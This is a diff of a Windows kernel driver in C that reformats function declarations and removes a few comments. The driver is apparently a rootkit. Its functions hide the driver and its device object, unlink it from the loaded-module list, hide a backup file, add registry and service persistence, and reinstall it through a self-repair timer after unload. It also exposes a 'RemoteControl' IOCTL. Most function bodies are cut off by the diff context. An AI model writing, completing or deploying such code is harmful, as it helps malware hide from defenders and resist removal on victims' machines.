@@ -36,21 +36,36 @@ typedef struct _LDR_DATA_TABLE_ENTRY {
 #define IOCTL_REMOTE_CONTROL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define REINSTALL_TIMEOUT 5000 // Timeout in milliseconds for reinstallation
 
-// Function declarations
-NTSTATUS DriverControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
-NTSTATUS CreateClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
-VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject);
-VOID SelfRepair(IN PDRIVER_OBJECT DriverObject);
-VOID TimerDpcRoutine(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2);
-VOID InstallRegistryPersistence(IN PDRIVER_OBJECT DriverObject);
-VOID HideDriver(PDRIVER_OBJECT DriverObject);
-VOID RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject);
-VOID HideDeviceObject(PDRIVER_OBJECT DriverObject);
-VOID UnlinkDriverFromModuleList(PDRIVER_OBJECT DriverObject);
+NTSTATUS
+DriverControl(IN PDEVICE_OBJECT DeviceObject,
+            IN PIRP Irp);
+NTSTATUS 
+CreateClose(IN PDEVICE_OBJECT DeviceObject,
+            IN PIRP Irp);
+VOID 
+UnloadDriver(IN PDRIVER_OBJECT DriverObject);
+VOID 
+SelfRepair(IN PDRIVER_OBJECT DriverObject);
+VOID 
+TimerDpcRoutine(IN PKDPC Dpc,
+                IN PVOID DeferredContext,
+                IN PVOID SystemArgument1, 
+                IN PVOID SystemArgument2);
+VOID 
+InstallRegistryPersistence(IN PDRIVER_OBJECT DriverObject);
+VOID 
+HideDriver(PDRIVER_OBJECT DriverObject);
+VOID 
+RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject);
+VOID 
+HideDeviceObject(PDRIVER_OBJECT DriverObject);
+VOID 
+UnlinkDriverFromModuleList(PDRIVER_OBJECT DriverObject);
 
 #define MAX_PATH 260
 
-VOID CreateDriverBackup(VOID)
+VOID 
+CreateDriverBackup(VOID)
 {
     HANDLE fileHandle;
     OBJECT_ATTRIBUTES objectAttributes;
@@ -147,7 +162,6 @@ HideBackupFile(VOID)
 
 // ###############################################
 
-
 VOID 
 RestoreDriverFromBackup(VOID)
 {
@@ -226,7 +240,8 @@ extern NTSTATUS NTAPI ZwQuerySystemInformation(
     PULONG ReturnLength
 );
 
-VOID ObscureDriverFromModuleList(PDRIVER_OBJECT DriverObject)
+VOID 
+ObscureDriverFromModuleList(PDRIVER_OBJECT DriverObject)
 {
     ULONG bufferSize = 0x10000; // 64KB
     PVOID buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, 'modl');
@@ -269,8 +284,7 @@ VOID ObscureDriverFromModuleList(PDRIVER_OBJECT DriverObject)
 }
 
 VOID 
-UnlinkDriverFromModuleList
-(PDRIVER_OBJECT DriverObject)
+UnlinkDriverFromModuleList(PDRIVER_OBJECT DriverObject)
 {
     ULONG bufferSize = 0x10000; // 64KB
     PVOID buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, 'modl');
@@ -313,8 +327,7 @@ UnlinkDriverFromModuleList
 }
 
 VOID 
-RemoveFromLoadedModulesList
-(PDRIVER_OBJECT DriverObject)
+RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject)
 {
     ULONG bufferSize = 0x10000; // 64KB
     PVOID buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, 'modl');
@@ -357,7 +370,8 @@ RemoveFromLoadedModulesList
 }
 
 // Function to handle registry persistence
-VOID InstallRegistryPersistence(IN PDRIVER_OBJECT DriverObject)
+VOID 
+InstallRegistryPersistence(IN PDRIVER_OBJECT DriverObject)
 {
     UNREFERENCED_PARAMETER(DriverObject); // Suppress warning about unused parameter
 
@@ -394,12 +408,10 @@ extern PDRIVER_OBJECT g_DriverObject;
 PDRIVER_OBJECT g_DriverObject = NULL;
 
 VOID 
-InstallServicePersistence
-(IN PDRIVER_OBJECT DriverObject);
+InstallServicePersistence(IN PDRIVER_OBJECT DriverObject);
 
 VOID 
-InstallServicePersistence
-(IN PDRIVER_OBJECT DriverObject)
+InstallServicePersistence(IN PDRIVER_OBJECT DriverObject)
 {
     UNICODE_STRING serviceName = RTL_CONSTANT_STRING(SERVICE_NAME);
     WCHAR path[MAX_PATH];
@@ -432,7 +444,8 @@ InstallServicePersistence
 }
 
 // Function to handle self-repair and re-installation
-VOID SelfRepair(IN PDRIVER_OBJECT DriverObject)
+VOID 
+SelfRepair(IN PDRIVER_OBJECT DriverObject)
 {
     UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\RemoteControlDevice");
     UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\??\\RemoteControlLink");
@@ -470,7 +483,8 @@ VOID SelfRepair(IN PDRIVER_OBJECT DriverObject)
 }
 
 // Function to unload the driver with a self-repair mechanism
-VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject)
+VOID 
+UnloadDriver(IN PDRIVER_OBJECT DriverObject)
 {
     UNREFERENCED_PARAMETER(DriverObject);
     g_DriverObject = DriverObject;
@@ -486,7 +500,11 @@ VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject)
 }
 
 // Timer DPC routine for reinstallation and persistence
-VOID TimerDpcRoutine(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
+VOID 
+TimerDpcRoutine(IN PKDPC Dpc,
+                IN PVOID DeferredContext,
+                IN PVOID SystemArgument1,
+                IN PVOID SystemArgument2)
 {
     UNREFERENCED_PARAMETER(Dpc);
     UNREFERENCED_PARAMETER(DeferredContext);
@@ -497,7 +515,9 @@ VOID TimerDpcRoutine(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgu
     SelfRepair(g_DriverObject); // Ensure g_DriverObject is of type PDRIVER_OBJECT
 }
 
-NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
+NTSTATUS 
+DriverEntry(IN PDRIVER_OBJECT DriverObject,
+            IN PUNICODE_STRING RegistryPath)
 {
     UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\RemoteControlDevice");
     UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\??\\RemoteControlLink");
@@ -550,7 +570,9 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING Registry
     return STATUS_SUCCESS;
 }
 
-NTSTATUS DriverControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
+NTSTATUS 
+DriverControl(IN PDEVICE_OBJECT DeviceObject,
+              IN PIRP Irp)
 {
     PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
     NTSTATUS status = STATUS_SUCCESS;
@@ -558,7 +580,6 @@ NTSTATUS DriverControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
     switch (irpSp->Parameters.DeviceIoControl.IoControlCode) {
     case IOCTL_REMOTE_CONTROL:
         DbgPrint("[+] IOCTL_REMOTE_CONTROL received.\n");
-        // Handle the IOCTL request
         break;
     default:
         status = STATUS_INVALID_DEVICE_REQUEST;
@@ -571,7 +592,9 @@ NTSTATUS DriverControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
     return status;
 }
 
-NTSTATUS CreateClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
+NTSTATUS 
+CreateClose(IN PDEVICE_OBJECT DeviceObject,
+            IN PIRP Irp)
 {
     UNREFERENCED_PARAMETER(DeviceObject);
 
@@ -581,16 +604,16 @@ NTSTATUS CreateClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
     return STATUS_SUCCESS;
 }
 
-VOID HideDriver(PDRIVER_OBJECT DriverObject)
+VOID 
+HideDriver(PDRIVER_OBJECT DriverObject)
 {
     UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\RemoteControlDevice");
-
-    // Hide the device object
     HideDeviceObject(DriverObject);
     DbgPrint("[+] Driver hidden.\n");
 }
 
-VOID HideDeviceObject(PDRIVER_OBJECT DriverObject)
+VOID 
+HideDeviceObject(PDRIVER_OBJECT DriverObject)
 {
     PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
     while (deviceObject) {
